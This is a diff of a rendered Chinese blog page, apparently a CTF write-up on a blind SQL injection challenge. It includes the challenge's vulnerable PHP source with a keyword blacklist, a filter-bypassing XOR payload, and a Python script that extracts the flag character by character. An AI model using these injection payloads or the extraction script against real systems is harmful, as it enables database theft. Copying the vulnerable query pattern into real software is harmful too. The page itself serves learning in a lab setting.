@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      523 字
+      527 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      9
        分钟
     </span>
   
@@ -240,71 +240,75 @@ Error Occured When Fetch Result.
 1&#39; or 1=1#     
 SQL Injection Checked.      </code></pre></div>
 <p>应该是有过滤的，burp看看<img src="https://ftp.bmp.ovh/imgs/2021/02/3880c49a96ccc108.png" srcset="/img/loading.gif"><br>482的都被过滤了<br><code>union、select、空格、#、+、-。。。。。  </code><br>同时也可以看到ascii和substr没有被过，<br>输入2/2可以判断是数字型<br>空格可以用<code>()</code>绕过<br>或者异或<code>1^</code><br>payload:<code>1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</code> </p>
-<p>别人wp里看到的题目源码<br>    &lt;?php<br>    $dbuser=’root’;<br>    $dbpass=’root’;</p>
-<div class="hljs"><pre><code>function safe($sql)&#123;
-    #被过滤的内容 函数基本没过滤
-    $blackList = array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;`&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;./&#39;);
-    foreach($blackList as $blackitem)&#123;
-        if(stripos($sql,$blackitem))&#123;
-            return False;
+<p>别人wp里看到的题目源码         </p>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$dbuser=<span class="hljs-string">&#x27;root&#x27;</span>;
+$dbpass=<span class="hljs-string">&#x27;root&#x27;</span>;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params">$sql</span>)</span>&#123;
+    <span class="hljs-comment">#被过滤的内容 函数基本没过滤</span>
+    $blackList = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;||&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;or&#x27;</span>,<span class="hljs-string">&#x27;and&#x27;</span>,<span class="hljs-string">&#x27;`&#x27;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&#x27;group&#x27;</span>,<span class="hljs-string">&#x27;limit&#x27;</span>,<span class="hljs-string">&#x27;update&#x27;</span>,<span class="hljs-string">&#x27;delete&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;load_file&#x27;</span>,<span class="hljs-string">&#x27;outfile&#x27;</span>,<span class="hljs-string">&#x27;./&#x27;</span>);
+    <span class="hljs-keyword">foreach</span>($blackList <span class="hljs-keyword">as</span> $blackitem)&#123;
+        <span class="hljs-keyword">if</span>(stripos($sql,$blackitem))&#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;
         &#125;
     &#125;
-    return True;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;
 &#125;
-if(isset($_POST[&#39;id&#39;]))&#123;
-    $id = $_POST[&#39;id&#39;];
-&#125;else&#123;
-    die();
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;
+    $id = $_POST[<span class="hljs-string">&#x27;id&#x27;</span>];
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">die</span>();
 &#125;
-$db = mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);
-if(!$db)&#123;
-    die(mysql_error());
+$db = mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,$dbuser,$dbpass);
+<span class="hljs-keyword">if</span>(!$db)&#123;
+    <span class="hljs-keyword">die</span>(mysql_error());
 &#125;   
-mysql_select_db(&quot;ctf&quot;,$db);
+mysql_select_db(<span class="hljs-string">&quot;ctf&quot;</span>,$db);
 
-if(safe($id))&#123;
-    $query = mysql_query(&quot;SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1&quot;);
-
-    if($query)&#123;
+<span class="hljs-keyword">if</span>(safe($id))&#123;
+    $query = mysql_query(<span class="hljs-string">&quot;SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1&quot;</span>);
+    
+    <span class="hljs-keyword">if</span>($query)&#123;
         $result = mysql_fetch_array($query);
-
-        if($result)&#123;
-            echo $result[&#39;content&#39;];
-        &#125;else&#123;
-            echo &quot;Error Occured When Fetch Result.&quot;;
+        
+        <span class="hljs-keyword">if</span>($result)&#123;
+            <span class="hljs-keyword">echo</span> $result[<span class="hljs-string">&#x27;content&#x27;</span>];
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error Occured When Fetch Result.&quot;</span>;
         &#125;
-    &#125;else&#123;
+    &#125;<span class="hljs-keyword">else</span>&#123;
         var_dump($query);
     &#125;
-&#125;else&#123;
-    die(&quot;SQL Injection Checked.&quot;);
-&#125;         </code></pre></div>
-<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><div class="hljs"><pre><code>import requests
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;SQL Injection Checked.&quot;</span>);
+&#125;</code></pre></div></code></pre>
+<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><div class="hljs"><pre><code><pre><code class="hljs php">import requests
 import base64
 import sys
-import string
+import <span class="hljs-keyword">string</span>
 import hashlib
 import io
 import time
 
-sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;utf-8&#39;)        #改变标准输出的默认编码,否则s.text不能输出
-x = string.printable
-flag = &quot;&quot;
-url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;
+sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)		<span class="hljs-comment">#改变标准输出的默认编码,否则s.text不能输出</span>
+x = <span class="hljs-keyword">string</span>.printable
+flag = <span class="hljs-string">&quot;&quot;</span>
+url = <span class="hljs-string">&quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;</span>
 payload=&#123;
-    &quot;id&quot; : &quot;&quot;
+	<span class="hljs-string">&quot;id&quot;</span> : <span class="hljs-string">&quot;&quot;</span>
 &#125;
-for i in range(0,60):
-    for j in x:
-        payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot;%(str(i),ord(j))
-        s = requests.post(url,data=payload)
-        #print(s.text)
-        if &quot;Hello&quot; in s.text:
-            flag += j
-            print(flag)
-            break
-
-print(flag)           </code></pre></div>
+<span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">60</span>):
+	<span class="hljs-keyword">for</span> j in x:
+		payload[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">&quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot;</span>%(str(i),ord(j))
+		s = requests.post(url,data=payload)
+		<span class="hljs-comment">#print(s.text)</span>
+		<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> in s.text:
+			flag += j
+			<span class="hljs-keyword">print</span>(flag)
+			<span class="hljs-keyword">break</span>
+			
+<span class="hljs-keyword">print</span>(flag)</code></pre></div></code></pre>
 <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>空格绕过</strong>    </p>
 <ol>
 <li>用括号将任何可以计算结果的语句括起来        </li>
